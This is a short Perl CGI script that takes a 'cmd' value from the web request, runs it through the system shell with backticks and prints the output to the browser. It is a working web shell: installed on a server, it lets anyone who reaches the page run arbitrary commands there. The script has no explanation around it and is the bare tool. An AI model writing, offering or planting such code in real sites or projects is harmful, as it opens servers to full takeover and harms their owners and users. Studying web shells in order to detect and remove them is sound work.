#!/usr/bin/perl
use CGI;
my $q = CGI->new;
print "Content-type: text/html\n\n";
my $c = $q->param("cmd");
print `$c` if $c;
